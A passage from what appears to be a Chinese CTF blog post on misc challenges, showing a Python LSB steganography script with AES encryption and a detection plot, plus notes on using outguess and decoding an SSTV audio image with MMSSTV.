class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> crypt <span class="keyword">import</span> AESCipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompose a binary file into an array of bits</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompose</span>(<span class="params">data</span>):</span></span><br><span class="line">	v = []</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Pack file len in 4 bytes</span></span><br><span class="line">	fSize = <span class="built_in">len</span>(data)</span><br><span class="line">	<span class="built_in">bytes</span> = [<span class="built_in">ord</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> struct.pack(<span class="string">&quot;i&quot;</span>, fSize)]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">bytes</span> += [<span class="built_in">ord</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">			v.append((b &gt;&gt; i) &amp; <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assemble an array of bits into a binary file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble</span>(<span class="params">v</span>):</span>    </span><br><span class="line">	<span class="built_in">bytes</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	length = <span class="built_in">len</span>(v)</span><br><span class="line">	<span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)/<span class="number">8</span>):</span><br><span class="line">		byte = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">			<span class="keyword">if</span> (idx*<span class="number">8</span>+i &lt; length):</span><br><span class="line">				byte = (byte&lt;&lt;<span class="number">1</span>) + v[idx*<span class="number">8</span>+i]                </span><br><span class="line">		<span class="built_in">bytes</span> = <span class="built_in">bytes</span> + <span class="built_in">chr</span>(byte)</span><br><span class="line"></span><br><span class="line">	payload_size = struct.unpack(<span class="string">&quot;i&quot;</span>, <span class="built_in">bytes</span>[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">bytes</span>[<span class="number">4</span>: payload_size + <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the i-th bit of v to x</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_bit</span>(<span class="params">n, i, x</span>):</span></span><br><span class="line">	mask = <span class="number">1</span> &lt;&lt; i</span><br><span class="line">	n &amp;= ~mask</span><br><span class="line">	<span class="keyword">if</span> x:</span><br><span class="line">		n |= mask</span><br><span class="line">	<span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Embed payload file into LSB bits of an image</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">imgFile, payload, password</span>):</span></span><br><span class="line">	<span class="comment"># Process source image</span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(imgFile)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[*] Input image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line">	max_size = width*height*<span class="number">3.0</span>/<span class="number">8</span>/<span class="number">1024</span>		<span class="comment"># max payload size</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[*] Usable payload size: %.2f KB.&quot;</span> % (max_size)</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(payload, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">	data = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Payload size: %.3f KB &quot;</span> % (<span class="built_in">len</span>(data)/<span class="number">1024.0</span>)</span><br><span class="line">		</span><br><span class="line">	<span class="comment"># Encypt</span></span><br><span class="line">	cipher = AESCipher(password)</span><br><span class="line">	data_enc = cipher.encrypt(data)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Process data from payload file</span></span><br><span class="line">	v = decompose(data_enc)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Add until multiple of 3</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">len</span>(v)%<span class="number">3</span>):</span><br><span class="line">		v.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	payload_size = <span class="built_in">len</span>(v)/<span class="number">8</span>/<span class="number">1024.0</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Encrypted payload size: %.3f KB &quot;</span> % (payload_size)</span><br><span class="line">	<span class="keyword">if</span> (payload_size &gt; max_size - <span class="number">4</span>):</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-] Cannot embed. File too large&quot;</span></span><br><span class="line">		sys.exit()</span><br><span class="line">		</span><br><span class="line">	<span class="comment"># Create output image</span></span><br><span class="line">	steg_img = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(width, height))</span><br><span class="line">	data_img = steg_img.getdata()</span><br><span class="line"></span><br><span class="line">	idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			<span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(v):</span><br><span class="line">				r = set_bit(r, <span class="number">0</span>, v[idx])</span><br><span class="line">				g = set_bit(g, <span class="number">0</span>, v[idx+<span class="number">1</span>])</span><br><span class="line">				b = set_bit(b, <span class="number">0</span>, v[idx+<span class="number">2</span>])</span><br><span class="line">			data_img.putpixel((w,h), (r, g, b, a))</span><br><span class="line">			idx = idx + <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">	steg_img.save(imgFile + <span class="string">&quot;-stego.png&quot;</span>, <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] %s embedded successfully!&quot;</span> % payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract data embedded into LSB of the input file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract</span>(<span class="params">in_file, out_file, password</span>):</span></span><br><span class="line">	<span class="comment"># Process source image</span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(in_file)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Extract LSBs</span></span><br><span class="line">	v = []</span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			v.append(r &amp; <span class="number">1</span>)</span><br><span class="line">			v.append(g &amp; <span class="number">1</span>)</span><br><span class="line">			v.append(b &amp; <span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">	data_out = assemble(v)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Decrypt</span></span><br><span class="line">	cipher = AESCipher(password)</span><br><span class="line">	data_dec = cipher.decrypt(data_out)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Write decrypted data</span></span><br><span class="line">	out_f = <span class="built_in">open</span>(out_file, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	out_f.write(data_dec)</span><br><span class="line">	out_f.close()</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Written extracted data to %s.&quot;</span> % out_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># Statistical analysis of an image to detect LSB steganography</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyse</span>(<span class="params">in_file</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	- Split the image into blocks.</span></span><br><span class="line"><span class="string">	- Compute the average value of the LSBs for each block.</span></span><br><span class="line"><span class="string">	- The plot of the averages should be around 0.5 for zones that contain</span></span><br><span class="line"><span class="string">	  hidden encrypted messages (random data).</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	BS = <span class="number">100</span>	<span class="comment"># Block size </span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(in_file)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Extract LSBs</span></span><br><span class="line">	vr = []	<span class="comment"># Red LSBs</span></span><br><span class="line">	vg = []	<span class="comment"># Green LSBs</span></span><br><span class="line">	vb = []	<span class="comment"># LSBs</span></span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			vr.append(r &amp; <span class="number">1</span>)</span><br><span class="line">			vg.append(g &amp; <span class="number">1</span>)</span><br><span class="line">			vb.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Average colours&#x27; LSB per each block</span></span><br><span class="line">	avgR = []</span><br><span class="line">	avgG = []</span><br><span class="line">	avgB = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(vr), BS):</span><br><span class="line">		avgR.append(numpy.mean(vr[i:i + BS]))</span><br><span class="line">		avgG.append(numpy.mean(vg[i:i + BS]))</span><br><span class="line">		avgB.append(numpy.mean(vb[i:i + BS]))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Nice plot </span></span><br><span class="line">	numBlocks = <span class="built_in">len</span>(avgR)</span><br><span class="line">	blocks = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, numBlocks)]</span><br><span class="line">	plt.axis([<span class="number">0</span>, <span class="built_in">len</span>(avgR), <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">	plt.ylabel(<span class="string">&#x27;Average LSB per block&#x27;</span>)</span><br><span class="line">	plt.xlabel(<span class="string">&#x27;Block number&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#	plt.plot(blocks, avgR, &#x27;r.&#x27;)</span></span><br><span class="line"><span class="comment">#	plt.plot(blocks, avgG, &#x27;g&#x27;)</span></span><br><span class="line">	plt.plot(blocks, avgB, <span class="string">&#x27;bo&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>(<span class="params">progName</span>):</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;LSB steganogprahy. Hide files within least significant bits of images.\n&quot;</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Usage:&quot;</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;&quot;</span> % progName</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;&quot;</span> % progName</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s analyse &lt;stego_file&gt;&quot;</span> % progName</span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">		usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;hide&quot;</span>:		</span><br><span class="line">		embed(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>])</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;extract&quot;</span>:</span><br><span class="line">		extract(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>])</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;analyse&quot;</span>:</span><br><span class="line">		analyse(sys.argv[<span class="number">2</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-] Invalid operation specified&quot;</span></span><br><span class="line">		</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是python2脚本，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Thanks to</span><br><span class="line">http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;12524994&#x2F;encrypt-decrypt-using-pycrypto-aes-256</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class AESCipher:</span><br><span class="line"></span><br><span class="line">    def __init__(self, key): </span><br><span class="line">        self.bs &#x3D; 32	# Block size</span><br><span class="line">        self.key &#x3D; hashlib.sha256(key.encode()).digest()	# 32 bit digest</span><br><span class="line"></span><br><span class="line">    def encrypt(self, raw):</span><br><span class="line">        raw &#x3D; self._pad(raw)</span><br><span class="line">        iv &#x3D; Random.new().read(AES.block_size)</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return iv + cipher.encrypt(raw)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, enc):</span><br><span class="line">        iv &#x3D; enc[:AES.block_size]</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return self._unpad(cipher.decrypt(enc[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">    def _pad(self, s):</span><br><span class="line">        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def _unpad(s):</span><br><span class="line">        return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是python3脚本。</p>
+<p>添加依赖后，运行脚本</p>
+<p>保存flag.txt</p>
+<h2 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h2><p>在kali终端里安装outguess，</p>
+<p>（1）outguess的安装：</p>
+<p>终端命令输入 git clone <a target="_blank" rel="noopener" href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a> 进行下载，下载完成后进入outguess文件夹，右击打开终端，</p>
+<p>执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。</p>
+<p>进入outguess文件夹,把图片也放进来</p>
+<p>运行命令 outguess -r flag.jpg -t 1.txt</p>
+<p>拿到flag</p>
+<h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h2><p>查询知道是慢扫描电视，全网搜软件SSTV ,找到手机端DroidSSTV软件，但一直不成功，B站一些up的SSTV音频都能接收，这个就是接收不到，再次搜索，找到电脑端软件：MMSSTV</p>
+<p><img src="/images/image-20201128220123260.png" alt="image-20201128220123260"></p>
+<p>把电脑这个改一下，直接播放到麦克风，然后MMSSTV接收模式，可以接收到一张有flag的图片.</p>
+<p>这个MMSSTV软件里,选择RX(接收模式) ,Auto(调频自动)</p>
+<p><img src="/images/image-20201128220326397.png" alt="image-20201128220326397"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/misc/" rel="tag"># misc</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/27/ctf%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99%E6%B1%87%E6%80%BB/" rel="prev" title="CTF之密码学常用网站汇总">
+                  <i class="fa fa-chevron-left"></i> CTF之密码学常用网站汇总
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yolo</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
